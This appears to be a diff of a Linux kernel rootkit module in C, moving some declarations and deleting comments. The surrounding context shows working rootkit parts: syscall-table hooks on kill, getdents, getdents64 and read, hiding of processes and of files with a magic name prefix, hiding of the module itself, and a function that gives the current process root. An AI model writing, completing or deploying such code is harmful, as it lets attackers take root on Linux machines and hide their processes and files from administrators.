@@ -29,11 +29,6 @@ struct hidden_process {
     struct list_head list;
 };
 
-LIST_HEAD(hidden_processes);
-
-bool module_hidden;
-static struct list_head *prev_mod;
-
 typedef asmlinkage int (*kill_t)(pid_t, int);
 typedef asmlinkage int (*getdents_t)(unsigned int, struct linux_dirent *, unsigned int);
 typedef asmlinkage int (*getdents64_t)(unsigned int, struct linux_dirent64 *, unsigned int);
@@ -43,6 +38,11 @@ kill_t orig_kill;
 getdents_t orig_getdents;
 getdents64_t orig_getdents64;
 read_t orig_read;
+
+LIST_HEAD(hidden_processes);
+
+bool module_hidden;
+static struct list_head *prev_mod;
 
 uintptr_t *syscall_table;
 
@@ -93,7 +93,6 @@ give_current_root(void) {
 
 bool
 is_hidden_dirent(char *d_name, bool proc) {
-    // TODO macro
     return (proc && is_process_hidden(simple_strtoul(d_name, NULL, 10))) 
         || memcmp(MAGIC_PREFIX, d_name, strlen(MAGIC_PREFIX)) == 0;
 }
@@ -110,8 +109,6 @@ intercepted_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned
     if (kdirp == NULL) {
         return ret;
     }
-
-    /* Copy our directory entries into kernel-space */
     if (copy_from_user(kdirp, dirp, ret) != 0) {
         kfree(kdirp);
         return ret;
@@ -156,8 +153,6 @@ intercepted_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsi
     if (kdirp == NULL) {
         return ret;
     }
-
-    /* Copy our directory entries into kernel-space */
     if (copy_from_user(kdirp, dirp, ret) != 0) {
         kfree(kdirp);
         return ret;
